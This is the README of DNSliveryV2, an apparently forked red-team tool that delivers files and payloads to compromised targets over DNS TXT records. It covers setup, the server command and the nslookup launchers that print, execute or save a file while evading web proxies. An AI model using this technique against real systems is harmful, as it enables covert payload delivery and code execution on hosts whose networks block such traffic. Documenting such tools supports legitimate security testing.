![python-3.12](https://img.shields.io/badge/python-3.12-blue.svg)

# DNSliveryV2
DNSlivery allows easy file and payload delivery over DNS via TXT records.

## Note
I give all credit to the original author for their work. I will be adding documentation and additional features. Since I saw old PULL requests (3+ years), I made my own fork. 

## Features

- Deliver files over DNS using TXT records.
- Supports both PowerShell and Bash targets.
- Generates stagers for different delivery methods (print, exec, save).

## Requirements

- Python 3.x
- Scapy library

## Installation

1. Clone the repository:
    ```sh
    git clone https://github.com/your-repo/dnslivery.git
    cd dnslivery
    ```

2. Create a virtual environment and activate it:
    ```sh
    python -m venv venv
    source venv/bin/activate  # On Windows use `venv\Scripts\activate`
    ```

3. Install the required dependencies:
    ```sh
    pip install -r requirements.txt
    ```

## Usage

### Command Line Arguments

- `interface`: Network interface to listen to DNS traffic.
- `domain`: FQDN name of the DNS zone.
- `nameserver`: FQDN name of the server running DNSlivery.
- `-p`, `--path`: Path of the directory to serve over DNS (default: current directory).
- `-s`, `--size`: Size in bytes of base64 chunks (default: 255).
- `-v`, `--verbose`: Increase verbosity.
- `-t`, `--target`: Target language for stagers (default: PowerShell, options: `powershell`, `bash`).

### Example

To run DNSlivery, use the following command:

**bash**
```sh
sudo python dnslivery.py eth0 example.com ns.example.com -p /path/to/files -t bash
```

**powershell**
```sh
sudo python dnslivery.py eth0 example.com ns.example.com -p /path/to/files -t powershell
```

## Known issues

- I have encountered several issues when working with the dig command. To pull the payload, I needed to specify the nameserver (`@ns.example.com`) in the dig command. I am narrowing down the best solution I can think of and will. 

---
## Old Documentation 
Easy files and payloads delivery over DNS.

- [DNSlivery](#dnslivery)
- [Acknowledgments](#acknowledgments)
- [Description](#description)
  - [TL;DR](#tldr)
  - [What problem are you trying to solve?](#what-problem-are-you-trying-to-solve)
  - [How does it work?](#how-does-it-work)
  - [Requirements](#requirements)
- [Setup](#setup)
  - [DNS Zone](#dns-zone)
  - [DNSlivery](#dnslivery-1)
- [Usage](#usage)
  - [Server](#server)
  - [Target](#target)

# Acknowledgments
This project has been originally inspired by [PowerDNS](https://github.com/mdsecactivebreach/PowerDNS) and [Joff Thyer](https://twitter.com/joff_thyer)'s technical segment on the Paul's Security Weekly podcast #590 ([youtu.be/CP6cIwFJswQ](https://youtu.be/CP6cIwFJswQ)).

# Description
## TL;DR
DNSlivery allows to deliver files to a target using DNS as the transport protocol.

**Features**:
- allows to print, execute or save files to the target
- does not require any client on the target
- does not require a full-fledged DNS server

![demo-target.git](img/demo-target.gif)

## What problem are you trying to solve?
Easily deliver files and/or payloads to a compromised target where classic web delivery is not possible and **without the need for a dedicated client software**. This applies to restricted environments where outgoing web traffic is forbidden or simply inspected by a curious web proxy.

![web-delivery-blocked.png](img/web-delivery-blocked.png)

Even though more complete DNS tunneling tools already exist (s.a. [dnscat2](https://github.com/iagox86/dnscat2) and [iodine](https://code.kryo.se/iodine/)), they all require to run a dedicated client on the target. The problem is that there is probably no other way then DNS to deliver the client in such restricted environments. In other words, building a DNS communication channel with these tools require to already have a DNS communication channel.

In comparison, DNSlivery only provides one-way communication from your server to the target but does not require any dedicated client to do so. Thus, if you need to build a reliable two-way communication channel over DNS, use DNSlivery to deliver the client of a more advanced DNS tunneling tool to your target.

## How does it work?
Just like most DNS tunneling tools, DNSlivery uses `TXT` records to store the content of files in their base64 representation. However, it does not require to setup a full-fledged DNS server to work. Instead, it uses the [scapy](https://scapy.net/) library to listen for incoming DNS packets and craft the desired response. 

![network-process.png](img/network-process.png)

As most files do not fit in a single `TXT` record, DNSlivery will create multiple ordered records containing base64 chunks of the file. As an example, the above diagram illustrates the delivery of the 42<sup>nd</sup> chunk of the file named `file`.

In order to retrieve all base64 chunks and put them back together without the need for a dedicated client on the target, DNSlivery will generate for every file:

- a simple cleartext launcher
- a reliable base64 encoded stager

![two-stages-delivery.png](img/two-stages-delivery.png)

This two-stages delivery process is required to add features to the stager (s.a. handling lost DNS responses) that would otherwise not fit in a single `TXT` record.

### Note on target compatibility
Currently, only PowerShell targets are supported. However, DNSlivery could be improved to support additional targets such as bash or python. Please let me know [@no0be](https://twitter.com/no0be) if this is a feature that you would like to see being implemented.

## Requirements
DNSlivery does not require to build a complex server infrastructure. In fact, there are only two simple requirements: 

- be able to create a `NS` record in your public DNS zone
- have a Linux server capable of receiving `udp/53` traffic from the Internet

# Setup
## DNS Zone
The first step is to delegate a sub-domain to the server that will run DNSlivery by creating a new `NS` record in your domain. As an example, I created the following record to delegate the sub-domain `dnsd.no0.be` to the server at `vps.no0.be`.

```
dnsd    IN  NS vps.no0.be.
```

If your zone is managed by a third-party provider, refer to their documentation to create the `NS` record.

## DNSlivery
The only requirements to run DNSlivery are `python3` and its `scapy` library.
```bash
git clone https://github.com/no0be/DNSlivery.git && cd DNSlivery
pip install -r requirements.txt
```

# Usage
## Server
DNSlivery will serve all files of a given directory (`pwd` by default) and needs to be **run with root privileges** to listen for incoming `udp/53` packets.

```
usage: dnslivery.py [-h] [-p PATH] [-s SIZE] [-v] interface domain nameserver

DNSlivery - Easy files and payloads delivery over DNS

positional arguments:
  interface             interface to listen to DNS traffic
  domain                FQDN name of the DNS zone
  nameserver            FQDN name of the server running DNSlivery

optional arguments:
  -h, --help            show this help message and exit
  -p PATH, --path PATH  path of directory to serve over DNS (default: pwd)
  -s SIZE, --size SIZE  size in bytes of base64 chunks (default: 255)
  -v, --verbose         increase verbosity
```

**Example**: 
```
$ sudo python3 dnslivery.py eth0 dnsd.no0.be vps.no0.be -p /tmp/dns-delivery

DNSlivery - Easy files and payloads delivery over DNS

[*] File "file" ready for delivery at file.dnsd.no0.be (7 chunks)
[*] Listening for DNS queries...
```

### Note on filename normalization
As the charset allowed for domain names is much more restrictive than for UNIX filenames (per [RFC1035](https://tools.ietf.org/html/rfc1035#section-2.3.1)), DNSlivery will perform normalization when required.

**Example**:
```
[*] File "My Awesome Powershell Script ;).ps1" ready for delivery at my-awesome-powershell-script----ps1.dnsd.no0.be (1891 chunks)
```

**Be aware that the current normalization code is not perfect as it does not take overlapping filenames or size limit into account.**

## Target
On the target, start by **retrieving the launcher** of the desired file by requesting its dedicated `TXT` record. The following three launchers are supported:

| Action  | Launcher                    | Description                                           |
| ------- | --------------------------- | ----------------------------------------------------- |
| Print   | `[filename].print.[domain]` | (**Default**) Print the delivered file to the console |
| Execute | `[filename].exec.[domain]`  | Execute the delivered file (useful for scripts)       |
| Save    | `[filename].save.[domain]`  | Save the delivered file to disk (useful for binaries) |

```cmd
nslookup -type=txt [filename].[stager].[domain]
```

Then, simply **copy and paste the launcher quoted in the DNS response to a PowerShell console** to retrieve the file on the target.

**Example**:

![demo-target.git](img/demo-target.gif)
